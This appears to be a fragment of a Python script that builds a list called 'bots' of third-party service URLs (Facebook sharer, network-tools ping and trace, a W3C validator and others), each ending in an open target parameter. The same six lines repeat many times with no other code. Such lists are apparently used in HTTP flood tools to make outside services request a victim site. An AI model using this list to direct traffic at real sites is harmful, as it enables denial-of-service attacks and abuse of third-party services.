	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
